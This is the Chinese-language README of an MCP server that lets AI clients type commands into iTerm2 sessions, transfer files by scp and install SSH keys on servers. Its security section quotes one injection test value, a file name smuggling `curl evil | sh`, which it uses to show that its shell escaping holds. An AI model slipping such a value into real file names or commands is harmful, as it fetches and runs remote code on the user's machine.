# iterm2-mcp

[![PyPI version](https://img.shields.io/pypi/v/iterm2-mcp-zanlan.svg)](https://pypi.org/project/iterm2-mcp-zanlan/)
[![Python 3.12+](https://img.shields.io/badge/python-3.12%2B-blue.svg)](https://pypi.org/project/iterm2-mcp-zanlan/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

[English](README.md) | **简体中文**

一个「可见执行」理念的 iTerm2 MCP server：所有命令都以**打字方式（send text）**注入终端 session，与用户手敲完全一致，全程肉眼可监督。**不提供任何 exec / 静默执行类工具。**

灵感来自 electerm 的 MCP 集成与 [ferrislucas/iterm-mcp](https://github.com/ferrislucas/iterm-mcp)，但面向「多服务器 profile 管理」场景做了定制。

## 特性

- **连接 iTerm2 保存的 profiles**：按 profile 名（或 GUID）新建 tab；profile 重名时报错列出 GUID，绝不静默选错机器
- **可见执行**：`send_command` 等价于用户手敲命令并回车；`send_text` 用于 REPL / 交互式程序的逐步输入。没有绕过终端屏幕的执行通道
- **按名寻址**：建 tab 后 session 自动以 profile 名注册，agent 可随时重命名，之后所有工具用名字操作
- **自动登录**：profile 配置了自动键入密码时，检测到密码提示符自动补发回车完成登录
- **文件传输**：`upload_file` / `download_file` 在本地 shell session 里驱动 scp（Mac 主动出站，公网服务器同样可用）；`distribute_key` 把 Mac 公钥 send 注入已登录的服务器 session（无需密码），之后传输全自动免密；`check_transfer` 双端 md5 校验
- 多 session 管理：列出 / 聚焦（切 tab）/ 关闭

## 工具集

| 工具 | 说明 |
|---|---|
| `list_profiles` | 列出所有 iTerm2 profile 名（标注重名项） |
| `list_sessions` | 列出所有 window/tab/session（id、name、mcp 名） |
| `create_session` | 按 profile 名新建 tab，session 自动命名为 profile 名 |
| `create_session_by_guid` | 按 GUID 新建 tab（用于 profile 重名时精确指定） |
| `focus_session` | 把 iTerm2 窗口聚焦到指定 session（选中所在 tab 并置前） |
| `close_session` | 关闭指定 session（按 name 或 id） |
| `rename_session` | 重命名 session |
| `send_command` | 向指定 session 发送一行命令（自动补 `\n`，打字可见） |
| `send_text` | 向指定 session 发送任意文本/按键（REPL 用；不带换行） |
| `read_screen` | 读取指定 session 当前屏幕内容（按行返回） |
| `interrupt` | 向指定 session 发 Ctrl+C |
| `create_local_session` | 新建本地 shell tab 并注册为 `local-shell`（传输工具使用） |
| `upload_file` | 上传本地文件到服务器（scp，Mac 主动发起） |
| `download_file` | 从服务器下载文件到本地（scp，Mac 主动发起） |
| `distribute_key` | 向已登录服务器 session 分发 Mac 公钥 + 预扫描 host key（一次性，之后免密） |
| `check_transfer` | 双端 md5 对比校验传输完整性 |

所有支持 name 寻址的工具同时接受 session id，`name_or_id` 参数自动识别。

## 环境要求

- macOS + iTerm2 ≥ 3.5（在 Settings → General → Magic → Enable Python API 开启）
- Python 3.12+

## 安装与注册

### 前置：安装 pipx 或 uv（任选其一，若尚未安装）

方式一/方式二分别依赖 pipx / uvx 命令，没有的话先装（macOS 用 Homebrew）：

```bash
brew install pipx          # https://pipx.pypa.io
# 或
brew install uv            # https://docs.astral.sh/uv/ （uvx 随 uv 提供）
```

没有 Homebrew 的机器也可以用官方安装脚本（见上面两个链接），或跳过此步直接用方式三。

### 方式一：pipx 安装（推荐，隔离环境）

```bash
pipx install iterm2-mcp-zanlan
```

然后注册（Claude Desktop / .mcp.json 通用 JSON 配置）：

```json
{
  "mcpServers": {
    "iterm2": {
      "command": "iterm2-mcp"
    }
  }
}
```

Claude Code 一行命令：

```bash
claude mcp add iterm2 -- iterm2-mcp
```

### 方式二：uvx 免安装直接跑

```json
{
  "mcpServers": {
    "iterm2": {
      "command": "uvx",
      "args": ["iterm2-mcp-zanlan"]
    }
  }
}
```

### 方式三：从源码跑

```bash
git clone https://github.com/Zane-lan/iterm2-mcp.git
cd iterm2-mcp
pip install iterm2 "mcp[cli]>=1,<2"   # homebrew Python 需加 --user --break-system-packages
```

```json
{
  "mcpServers": {
    "iterm2": {
      "command": "/path/to/python3.12",
      "args": ["/path/to/iterm2-mcp/src/iterm2_mcp/server.py"]
    }
  }
}
```

## 设计决策

1. **profile 重名防呆**：按名字建 tab 时若命中多个 profile，报错并列出所有重名 profile 的 GUID，由用户选择或去 iTerm2 删除重名项；另提供按 GUID 建立的工具
2. **建 tab 自动命名**：通过 profile 建 tab 后，session 自动命名为 profile 名，后续按 name 寻址
3. **name 寻址以 MCP 维护的注册表为准**（`~/.config/iterm2-mcp/registry.json`）——实测发现 shell integration 会在每条命令后用 OSC 转义序列把 session 标题重置回自动名（`~ (-zsh)`），`session.name` 不可靠，所以 `set_name` 仅尽力让 tab 标题可见，寻址不受影响；注册表未命中时兜底做实时 `session.name` 前缀匹配
4. **只 send，不 exec**：工具集里不存在绕过终端屏幕的执行通道
5. **免密传输以 `user@host` 精确字符串为键**：`distribute_key` 会登记它配置的 `user@host`，传输工具对其他写法（换了用户、或把 IP 换成 `localhost`/主机名）一律报错并列出已登记的写法——它防的正是「换个会话或换个写法后静默卡在密码提示」这种故障

## 安全说明

- **仅本地**：服务走 stdio，不监听任何端口，只有你注册的 AI 客户端能连。在终端执行任意命令是产品本身的能力而非副作用——命令出现时请照常过目。
- **shell 转义**：传输工具拼进 `scp` / `ssh` 的所有路径与账号信息都在本地和远端两层命令行做了单引号转义（用 `x"; curl evil | sh; #.log` 这类恶意文件名实测验证）。
- **host key 盲信（TOFU）**：`distribute_key` 用 `ssh-keyscan` 抓取 host key 直接写入 `known_hosts`，不做带外校验——这是 `ssh-keyscan` 自身的 trust-on-first-use 取舍。若首次连接存在中间人风险，请自行核对指纹后再用传输工具。
- **`distribute_key` 会授予长期访问**：它把你的公钥追加进服务器 `authorized_keys`；要撤销就去掉该服务器上对应那行。

## 常见问题

**「同一个会话里免密成功，另一个会话还要密码」**：免密状态存在两个地方——服务器上的 `~/.ssh/authorized_keys`（按**登录用户**区分）和 Mac 上的 `~/.ssh/known_hosts`（按你敲的**精确主机字符串**匹配）。所以 `root@10.10.10.136` 和 `mbs@10.10.10.136` 是两个不同目标，`root@localhost` 与 `root@10.10.10.136` 即使指向同一台机器也算不同条目。`server_user`/`server_host` 请始终传成与 `distribute_key` 时完全一致的写法；0.2.4 起传输工具会直接拒绝未登记的写法并列出已登记项。

## 验证

端到端集成测试（会在 iTerm2 真实开 tab / 发命令 / Ctrl+C / 关 tab）：

```bash
python3.12 test_e2e.py
```

## 实现要点（踩坑记录）

- iTerm2 3.6.x 的 Python API 不再监听 TCP 1912，改走 Unix Domain Socket（`~/Library/Application Support/iTerm2/private/socket`），官方 `iterm2` 包会自动探测
- 在自定义事件循环里使用 iterm2 库，必须同时启动 `Connection._async_dispatch_forever` 分发循环，否则所有 RPC 挂起无响应
- `iterm2` 包 2.30 的入口是 `iterm2.run_until_complete(coro)`；`ScreenContents` 用 `line(i)` 方法；`App.current_session` 已移除
- FastMCP 的 lifespan 必须在 `FastMCP(...)` 构造时传入，事后设 `settings.lifespan` 无效

## License

MIT
